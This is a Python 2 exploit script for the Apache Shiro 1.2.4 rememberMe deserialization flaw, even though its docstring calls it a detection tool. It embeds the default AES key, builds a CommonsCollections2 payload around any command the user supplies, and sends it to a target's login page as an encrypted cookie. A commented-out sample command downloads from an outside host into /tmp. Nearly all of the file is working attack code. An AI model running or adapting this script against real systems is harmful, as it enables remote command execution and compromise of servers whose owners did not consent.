#coding:utf-8
'''
	shiro-69 远程命令执行漏洞检测
'''
from Crypto.Cipher import AES
from Crypto import Random
import sys
import os
import base64
import commands
import requests

def check(temp):
    ip = temp[0]
    port = temp[1]
    print "checking ip {}".format(ip)
    url = "http://{}:{}/s/login".format(ip,port)
    try:
        #cmdcheck = "curl http://baidu.com -o /tmp/baidu"
        cmdcheck = sys.argv[3]
        exploitApacheShiro(url, cmdcheck)
    except Exception, e:
        print '[!] connection failed! url: '+url

def exploitApacheShiro(url,cmdstr):
    key = base64.b64decode('kPH+bIxk5D2deZiIxcaaaA==') # Default AES Key for shiro 1.2.4
    payload = generateApacheShiroPayload(cmdstr)
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                             'Chrome/45.0.2454.101 Safari/537.36',
               'Cookie': 'rememberMe=%s' % shiroAesEncryption(key, open(payload, 'rb').read()),
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}
    #conn = requests.get(url, timeout=10, verify=False, headers=headers,proxies={"http":"127.0.0.1:8085"})
    conn = requests.get(url, timeout=10, verify=False, headers=headers)
    status_conn = conn.status_code
    if os.path.exists(os.path.dirname(os.path.realpath(__file__))+"/"+payload):
        os.remove(os.path.dirname(os.path.realpath(__file__))+"/"+payload)
    if status_conn == 200:
        return "succeed"
    else:
        return "failed"

def shiroAesEncryption(key, text):
    BS = AES.block_size
    pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
    unpad = lambda s: s[0:-ord(s[-1])]
    IV = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, IV=IV)
    data = base64.b64encode(IV + cipher.encrypt(pad(text)))
    return data

def generateApacheShiroPayload(cmdstr):
    payload = "payload.t"
    cmd = "java -jar shiro.jar CommonsCollections2 '"+cmdstr+"' > "+payload
    (status, output) = commands.getstatusoutput(cmd)
    if status == 0:
        return payload
    else:
        print "[!] generate payload failed!"
        exit()

def main(ip,port):
    check((ip,port))

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print "Usage:\tpython shirotest.py ip port cmd"
        exit(0)
    main(sys.argv[1],sys.argv[2])
